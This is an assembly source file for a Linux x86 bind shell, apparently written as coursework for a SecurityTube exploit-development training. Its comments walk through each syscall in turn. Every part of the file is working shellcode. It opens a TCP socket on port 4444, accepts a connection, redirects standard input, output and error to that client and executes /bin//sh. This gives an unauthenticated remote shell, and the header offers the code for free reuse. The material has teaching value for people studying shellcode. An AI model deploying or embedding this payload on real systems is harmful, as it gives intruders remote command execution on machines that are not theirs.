; Filename: bind_shell.nasm
; Author:  Rob W
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: Bind shell written in Linux x86 Assembly. The default listening port is 4444. Use the port configurator to choose a different listening port.
; You are free to use and redistribute this code as you wish.

global _start			

section .text
_start:


make_socketfd:

	;find syscalls within /usr/include/asm/uinstd_32.h
	;find socketcall numbers in /usr/include/linux/net.h
	;socket(int domain, int type, int protocol)
	;socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	; our registers need to look like so:
	; eax: sys call for socketcall
	; ebx: type of socketcall
	; ecx: pointer to our argument array

	xor eax, eax
	xor ebx, ebx
	xor edx, edx ; zeroing out our register
	mov al, 102 ;syscall number for socketcall is 102
	mov bl, 1 ;socketcall type is 1: sys_socket

	;now pushing arguments for the sys_socket call onto the stack in reverse order

	push edx ; number for TCP is 0 (this is protocol)
	push 1 ; number for SOCK_STREAM is 1 (this is type)
	push 2 ; number for AF_INET is 2 (this is domain)

	;make a pointer to the argument array then make the syscall

	mov ecx, esp ; ESP points to the top of our stack which is where our arguments are stored
	int 0x80 ; created our socket file descriptor now. this will be returned to eax.
	xor edi, edi ;clear register
	xchg edi, eax ; exchange the nulls in edi for the socket file descriptor

call_sysbind:

	;binding our socket to an address
	;bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	;bind(sockfd, [AF_INET,4444, INADDR_ANY], 16)

	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	mov al, 102 ;this is our socketcall syscall again - 102
	mov bl, 2 ;socketcall type is bind - 2

	;begin building our address struct
	push edx ; 0 refers to ANY address (INADDR_ANY) should be zeroes as we've not used edx for anything else yet
	push word 0x5c11 ; this is reversed hex for our port 4444 (115c)
	push word  2 ; refers to AF_INET
	mov ecx, esp ; save pointer to our address struct

	push 16 ; this is addrlen
	push ecx ; this is the pointer to our address struct
	push edi;

	mov ecx, esp ; pointer to our arguments

	int 0x80

call_listen:
	;listen for incoming connection
	;listen(sockfd, 0)
	xor eax, eax
	xor ebx, ebx
	mov al, 102 ;our trusty socketcall again
	mov bl, 4 ; sys_listen is 4

	;setting up our arguments
	push edx ; should still be zero
	push edi ;

	mov ecx, esp ; pointer to our arguments

	int 0x80

accept_client:
	;int accept(sockfd, struct sockaddr *addr, socklen_t *addrlen)
	; accept(sockfd, NULL, NULL)

	mov al, 102 ; socketcall syscall is 102
	mov bl, 5 ; socketcall type is sys_accept which is 5

	;arguments in reverse order

	push edx ;null/zero
	push edx ;null/zero
	push edi ; socket file descriptor

	mov ecx, esp ;pointer to our args

	int 0x80

	mov edi, eax ; storing the client file descriptor


dup_descriptors:
	;this takes the stdin, stdout, stderr and points these to our socket
	; stdin - 0, stdout - 1, stderr - 2
	;int dup2(int oldfd, int newfd)
	; dup2(clientfd, blah)
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	mov cl, 2
	mov ebx, edi

loop:
	mov al, 63
	int 0x80
	dec ecx
	jns loop


;call_execve:

	;stack needs to look like
	;ADDR0x0000/bin//sh0x00000
	;    ^     ^
	;    edx   ebx

	xor eax, eax ;zeroing out eax so that it can be pushed onto stack
	push eax ;pushing zeroes onto the stack to point to the end of our execve command
	push 0x68732f2f ;pushing command onto the stack hs// (//sh)
	push 0x6e69622f ;pushing command onto the stack nib/ (/bin)
	mov ebx, esp ;saving the location of our commands into ebx
	push eax ;pushing more zeroes to make our stack proper
	mov edx, esp ;saving the address of the zeroes
	push ebx ;pushing the address of our /bin//sh
	mov ecx, esp ;saving the address of everything into ecx



	mov al, 11 ;system call for execve
	int 0x80

